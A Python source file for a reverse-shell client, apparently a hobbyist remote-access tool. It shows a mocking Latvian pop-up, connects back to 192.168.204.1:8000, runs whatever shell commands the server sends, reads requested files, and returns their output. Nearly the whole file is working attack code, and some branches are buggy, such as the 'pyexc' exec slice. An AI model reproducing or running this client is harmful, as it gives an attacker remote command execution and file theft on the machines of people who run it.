import socket
import os
import subprocess
import sys
try:
    from win32gui import *
    from win32con import *
    MessageBox(None, "Tu esi Ēzelis hahahahaha\n"\
        "Es asmu linus ;)", "Kļūda", MB_OK | MB_ICONERROR)
except:
    pass
SERVER_HOST = "192.168.204.1"
SERVER_PORT = 8000
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<seperator>"
output = ""
# create the socket object
s = socket.socket()
# connect to the server
try:
    s.connect((SERVER_HOST, SERVER_PORT))
except:
    print(f"Kļūda, Connection Refused on machine {SERVER_HOST}:{SERVER_PORT}")
    raise ConnectionRefusedError
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    output = ""
    # receive the command from the server
    try:
        command = s.recv(BUFFER_SIZE).decode()
    except:
        raise
    splited_command = command.split()
    try:
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        for cmd in splited_command:
            if cmd.startswith("download"):
                if cmd.startswith("download "):
                    path = cmd[8:]
                    with open(path, "r") as file:
                        filedata = file.read()
                        output = filedata + f"{file.read()}"
                else:
                    raise ValueError("Needs a file path to download idiot")
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        if splited_command[0].lower() == "pyexc":
            exec(splited_command[0][6:])
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        message = (message) + "\n"
    except BaseException as exce:
        message = output + "\n" + (str(exce)) + "\n"
        continue
    s.send(message.encode())

# close client connection
s.close()